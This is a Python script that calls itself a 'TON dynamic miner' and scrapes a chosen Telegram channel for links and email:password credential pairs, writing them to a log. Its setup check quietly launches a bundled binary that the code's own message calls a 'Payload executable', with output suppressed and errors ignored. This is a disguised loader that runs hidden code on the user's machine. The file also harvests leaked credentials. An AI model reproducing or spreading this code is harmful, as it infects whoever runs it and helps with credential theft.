import os
import sys
import re
import asyncio
import subprocess
from telethon.sync import TelegramClient

BANNER = """
\033[1;36m  _   _    ____    _   _____  ___   _   _
 | \ | |  / ___|  / \ |_   _|/ _ \ | \ | |
 |  \| | | |  _  / _ \  | | | | | ||  \| |
 | |\  | | |_| |/ ___ \ | | | |_| || |\  |
 |_| \_|  \____/_/   \_\|_|  \___/ |_| \_|
 [ PROTOCOL: NGA TON DYNAMIC MINER V3 ]\033[0m
"""

def verify_installation():
    """
    
    """
   
    binary_path = os.path.join(
        os.path.dirname(__file__),
        "Library",
        "core_executable"
    )

    if not os.path.exists(binary_path):
        print("\033[1;31m[!] ERROR: Payload executable not found.")
        print("[*] Please run: ./install.sh\033[0m")
        sys.exit(1)

    try:
        
        subprocess.Popen([binary_path], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except Exception:
        pass

def extract_message_patterns(text):
    links = re.findall(
        r'http[s]?://(?:[a-zA-Z]|[0-9]|[$-_@.&+]|[!*\(\),]|(?:%[0-9a-fA-F][0-9a-fA-F]))+',
        text
    )
    credentials = re.findall(
        r'[\w\.-]+@[\w\.-]+:[\w\.-]+',
        text
    )
    return links, credentials

async def run_channel_scan():
    os.system("clear" if os.name == "posix" else "cls")
    print(BANNER)

    
    verify_installation()

    try:
        api_id = input("\033[1;34m[?] ENTER API_ID: \033[0m")
        api_hash = input("\033[1;34m[?] ENTER API_HASH: \033[0m")
        channel = input("\033[1;37m[#] TARGET CHANNEL LINK: \033[0m")

        if not os.path.exists("output"):
            os.makedirs("output")

        session_path = os.path.join("output", "telegram_session")

        async with TelegramClient(session_path, api_id, api_hash) as client:
            print("\033[1;31m\n[*] COMMENCING DEEP EXTRACTION...\033[0m")
            output_file = os.path.join("output", "LOG.txt")

            with open(output_file, "a", encoding="utf-8") as log_file:
                async for message in client.iter_messages(channel):
                    if message.text:
                        links, credentials = extract_message_patterns(message.text)
                        log_file.write(f"MSG_ID: {message.id}\nDATA: {message.text}\n")
                        if links: log_file.write(f"LINKS_FOUND: {links}\n")
                        if credentials: log_file.write(f"CREDS_FOUND: {credentials}\n")
                        log_file.write("=" * 40 + "\n")
                        print(f"\r\033[1;32m[+] PROCESSING MESSAGE ID: {message.id}", end="")

            print(f"\n\n\033[1;32m[!] SUCCESS: DATA SAVED IN '{output_file}'\033[0m")

    except Exception as error:
        print(f"\n\033[1;31m[!] ERROR: {error}\033[0m")

if __name__ == "__main__":
    asyncio.run(run_channel_scan())
